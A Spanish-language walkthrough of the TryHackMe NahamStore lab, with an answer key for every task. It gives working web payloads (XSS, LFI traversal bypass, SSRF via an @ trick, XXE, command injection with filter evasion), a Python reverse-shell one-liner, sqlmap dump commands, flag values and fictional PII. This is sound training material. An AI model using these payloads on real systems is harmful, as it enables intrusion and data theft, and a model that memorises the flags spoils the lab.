# NahamStore

| **Dificultad** | Medium |
|---|---|
| **Tipo** | CTF |
| **Slug** | nahamstore |
| **Link** | [TryHackMe](https://tryhackme.com/room/nahamstore) |
| **Sección** | 02 Level Medium |
| **Fuente** | [TryHackMe - NahamStore](https://tryhackme.com/room/nahamstore) |
| **Componentes** | Recon / Enumeración de subdominios, IDOR, XSS (Reflejado y Almacenado), Open Redirect, CSRF, LFI / Path Traversal, SSRF, XXE y Blind XXE (vía XLSX), RCE / Command Injection, SQL Injection (UNION y Blind) |
| **Impacto** | Compromiso total de una tienda online ficticia: filtración de PII (SSN, correos, teléfonos, direcciones), tarjetas de crédito, ejecución remota de comandos en el servidor y lectura completa de la base de datos (tablas con flags). |

---

**Contexto:**
NahamStore es una tienda online simulada con decenas de vulnerabilidades web clásicas. Debes enumerar subdominios (contra `nahamstore.com`, sustituyendo `.com` por `.thm` para resolver contra tu máquina), añadir entradas en `/etc/hosts` y cazar cada fallo: IDOR, XSS, Open Redirect, CSRF, LFI, SSRF, XXE, RCE y SQLi. Todas las tareas pueden hacerse en cualquier orden, pero el punto de partida sugerido es la enumeración de subdominios.

**Herramientas recomendadas:** `wfuzz`, `gobuster`, `arjun` (detección de parámetros), Burp Suite (Intruder, Repeater, Turbo Intruder, Collaborator, Autorize), `xxeserv`, `sqlmap` y `SQLiDetector`.

## Solucionario

### Task 1: Setup

**Explicación:**
Rellena el campo de respuestas con el texto que confirma el despliegue de la máquina y tu comprensión de las instrucciones. Después añade `MACHINE_IP nahamstore.thm` a tu archivo `hosts` (`.thm` en lugar de la raíz real). Enumerarás subdominios contra `nahamstore.com` y, cuando descubras uno (p. ej. `marketing.nahamstore.com`), lo añadirás a `hosts` como `MACHINE_IP something.nahamstore.thm`.

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | I have deployed the machine | `No answer needed` |
| 2 | I understand! | `No answer needed` |

### Task 2: Recon

**Explicación:**
Con una combinación de enumeración de subdominios, fuerza bruta, content discovery y fuzzing se descubren los subdominios de la aplicación. Jimmy Jones aparece vía un endpoint de API vulnerable a IDOR:

```
GET /api/customers/?customer_id=2 HTTP/1.1
{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","ssn":"521-61-6392"}
```

El iterar `customer_id` de 0 a 99 con Burp Intruder revela que solo existen 3 usuarios (2 y 3), exponiendo sus datos personales completos.

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | Jimmy Jones SSN (Social Security number) | `521-61-6392` |

### Task 3: XSS

**Explicación:**
La aplicación tiene varias XSS repartidas; se pueden usar payloads de PayloadsAllTheThings o de `xsstrike`/`arjun` para descubrir vectores y parámetros ocultos:

- Reflejada en el subdominio de marketing: `http://marketing.nahamstore.thm/?error=`.
- Almacenada a través de la cabecera `User-Agent`.
- En la página de producto hay que escapar la etiqueta HTML `title` y la variable JS `search`.
- Parámetros ocultos que introducen XSS: `q` (detectado con arjun heurístico) y `discount` en la página del producto.
- En la página de devoluciones (`/returns/3?auth=<script>...`) hay que escapar la etiqueta `textarea`.
- La página 404 usa la URL pedida en su H1, lo que la hace vulnerable (valor del tag H1: `Page Not Found`).

```
http://nahamstore.thm/product?added=1&discount=%22%3Csvg/onload=alert(%27XSS%27)%3E
http://nahamstore.thm/returns/3?auth=<script>alert(window.origin)</script>
```

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | Enter an URL (including parameters) of an endpoint that is vulnerable to XSS | `http://marketing.nahamstore.thm/?error=` |
| 2 | What HTTP header can be used to create a Stored XXS | `User-Agent` |
| 3 | What HTML tag needs to be escaped on the product page to get the XSS to work? | `title` |
| 4 | What JavaScript variable needs to be escaped to get the XSS to work? | `search` |
| 5 | What hidden parameter can be found on the shop home page that introduces an XSS vulnerability. | `q` |
| 6 | What HTML tag needs to be escaped on the returns page to get the XSS to work? | `textarea` |
| 7 | What is the value of the H1 tag of the page that uses the requested URL to create an XSS | `Page Not Found` |
| 8 | What other hidden parameter can be found on the shop which can introduce an XSS vulnerability | `discount` |

### Task 4: Open Redirect

**Explicación:**
`arjun` contra `http://nahamstore.thm/` descubre dos parámetros mediante heurística (código de respuesta y longitud del body): `r` y `q`. Probando redirecciones:

```
http://nahamstore.thm/?r=https://www.google.com    → redirige a Google
http://nahamstore.thm/account/addressbook?redirect_url=https://www.google.com → redirige a Google
http://nahamstore.thm/register?redirect_url=https://www.google.com → funciona
http://nahamstore.thm/login?redirect_url=https://www.google.com   → funciona
```

El parámetro `r` redirige directamente; `redirect_url` aparece en addressbook, register y login. Un open redirect puede encadenarse con OAuth, phishing o para robar tokens.

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | Open Redirect One | `r` |
| 2 | Open Redirect Two | `redirect_url` |

### Task 5: CSRF

**Explicación:**
Inicia sesión y prueba los formularios de cambio de email/contraseña. Interceptando el POST vemos que la protección CSRF viene en el campo `csrf_protect`, cuyo valor es JSON en base64 con un `signature` HMAC:

```
POST /account/settings/email HTTP/1.1
Host: nahamstore.thm
csrf_protect=eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpjNU5ERTNOVGM0SW4wPSIsInNpZ25hdHVyZSI6IjI4MzcwZDAyYmIzODc3MmQ3MTBmNTU4ODZmOWFhMzRhIn0%3D&change_email=a1%40gmail.com
```

Si eliminas el campo `csrf_protect` la petición se procesa igualmente (`Email Changed`), por lo que se puede montar un PoC en una página hostil que publique el formulario sin token. La URL `/account/settings/password` no tiene protección CSRF en absoluto.

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | What URL has no CSRF protection | `http://nahamstore.thm/account/settings/password` |
| 2 | What field can be removed to defeat the CSRF protection | `csrf_protect` |
| 3 | What simple encoding is used to try and CSRF protect a form | `base64` |

### Task 6: IDOR

**Explicación:**
Hay dos IDOR que permiten leer información de otros usuarios:

1. Vía la API de clientes (`/api/customers/?customer_id=N`) se obtienen nombre, email, teléfono y SSN de cualquier usuario.
2. Vía el endpoint de devoluciones `GET /returns/1?auth=<md5>` la autorización depende de un hash MD5 predecible del ID del pedido; además, alterando el ID del pedido se leen los datos de otros pedidos (order ID 3).

Para confirmar los fallos de autorización se puede usar la extensión Autorize de Burp (replay con sesión no autenticada y modificación de cabeceras).

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | An existing user has an address in New York, find the first line of the address. | `160 Broadway` |
| 2 | The date and time of order ID 3 | `22/02/2021 11:42:13` |

### Task 7: Local File Inclusion

**Explicación:**
El endpoint de imágenes `GET /product/picture/?file=<nombre>.jpg` permite lectura arbitraria de archivos con un traversal. El filtro bloquea `../`, pero basta con doblar los puntos (`....//`) o usar payloads con `..//..//` para bypasearlo:

```
GET /product/picture/?file=../../../../../etc/passwd
GET /product/picture/?file=....//....//....//....//etc/passwd
GET /product/picture/?file=....//....//....//....//....//....//....//....//....//....//lfi/flag.txt
```

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | LFI Flag | `{7ef60e74b711f4c3a1fdf5a131ebf863}` |

### Task 8: SSRF

**Explicación:**
El endpoint de comprobación de stock `server=stock.nahamstore.thm` permite SSRF. Usando el truco del arroba (`@`) se fuerza la resolución DNS hacia un colaborador para confirmar la salida:

```
product_id=2&server=stock.nahamstore.thm@tdalp9ofw2fyixw8to5ybeygs7yymn.oastify.com#
```

Después se apunta directamente a la API interna que no debería ser accesible:

```
product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/70ac2193c8049fcea7101884fd4ef58e#
```

La API interna devuelve el pedido de Charles Cook, y realizando la consulta correcta se obtiene el pedido de Jimmy Jones con su tarjeta de crédito completa:

```
{"id":"5ae19241...","customer":{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","items":[...],
"payment":{"type":"MasterCard","number":"5190216301622131","expires":"11/2023","CVV2":"223"}}}
```

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | Credit Card Number For Jimmy Jones | `5190216301622131` |

### Task 9: XXE

**Explicación:**
El endpoint `POST /product/1` es vulnerable a XXE (requiere la cabecera `X-Token`). Con un documento XML tipo `xi:include` se lee `/flag.txt` directamente:

```
POST /product/1 HTTP/1.1
X-Token: <token>
Content-Type: application/xml

<?xml version="1.0"?>
<product xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///flag.txt"/>
</product>
```

Después hay una Blind XXE vía un archivo **XLSX** (un ZIP de XMLs), modificando el documento de estilos para exfiltrar datos por FTP con `xxeserv`:

```
echo "e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=" | base64 -d
{d6b22cb3e37bef32d800105b11107d8f}
```

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | XXE Flag | `{9f18bd8b9acaada53c4c643744401ea8}` |
| 2 | Blind XXE Flag | `{d6b22cb3e37bef32d800105b11107d8f}` |

### Task 10: RCE

**Explicación:**
El endpoint `POST /pdf-generator` genera PDFs a partir de pedidos y es vulnerable a **Command Injection** en el parámetro `id` con `;`:

```
what=order&id=4;whoami
Cannot find order: 4;whoami
```

Protecciones como `w'h'o'am'i` (interpolación dentro de comillas) o el bypass de filtro por URL-encoding `%3b` ayudan a esquivar el filtrado. Tras confirmar la ejecución (`witty`), se establece una reverse shell y se descubre que corre en un contenedor Docker (se listan los directorios raíz con los típicos volúmenes). En `/flag.txt` del contenedor hay dos flags, una para cada método de acceso/explotación.

```
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("MACHINE_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/bash")'
```

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | First RCE flag | `{b42d2f1ff39874d56132537be62cf9e3}` |
| 2 | Second RCE flag | `{93125e2a845a38c3e1531f72c250e676}` |

### Task 11: SQL Injection

**Explicación:**
Hay dos SQLi en el dominio NahamStore: una que devuelve datos a la página (union-based, detectada con `SQLiDetector`) y otra ciega. Ambas se explotan con `sqlmap` para volcar las tablas `sqli_one` y `sqli_two`, donde está la columna `flag`:

```
python3 sqlidetector.py -f test -w 10
sqlmap -u "http://nahamstore.thm/..." --batch --risk=3 --level=5 -D nahamstore -T sqli_one --dump
sqlmap -u "http://nahamstore.thm/..." --batch --risk=3 --level=5 -D nahamstore -T sqli_two --dump
```

```
Database: nahamstore
Table: sqli_two
[1 entry]
+----+------------------------------------+
| id | flag                               |
+----+------------------------------------+
| 1  | {212ec3b036925a38b7167cf9f0243015} |
+----+------------------------------------+
```

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | Flag 1 | `{d890234e20be48ff96a2f9caab0de55c}` |
| 2 | Flag 2 (blind) | `{212ec3b036925a38b7167cf9f0243015}` |

---

**Metodología:**
Recon (subdominios/hosts) → fuzzing de parámetros (arjun) → prueba sistemática de cada clase de vuln web en orden de superficie: IDOR (API + endpoints), XSS (reflejada/almacenada/404), Open Redirect, CSRF, Path Traversal/LFI, SSRF → API interna, XXE directa y Blind XXE vía XLSX, Command Injection → reverse shell, SQLi union-based + blind → dump de BD.

**Learning chain:**
Subdomain enumeration → IDOR through REST API → parameter discovery (`q`, `discount`, `r`, `redirect_url`) → XSS + Open Redirect + CSRF bypass (removing `csrf_protect`) → LFI with double-dot traversal → SSRF pivot to internal API → XXE out-of-band → command injection → reverse shell (container) → SQLmap dump of blind SQLi.

**MITRE ATT&CK:**
T1595.001 (Active Scanning), T1592 (Gather Victim Host Information), T1595.002 (Vulnerability Scanning), T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter), T1083 (File and Directory Discovery), T1005 (Data from Local System), T1046 (Network Service Discovery), T1213 (Data from Information Repositories).

**Fuente:** [TryHackMe - NahamStore](https://tryhackme.com/room/nahamstore)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
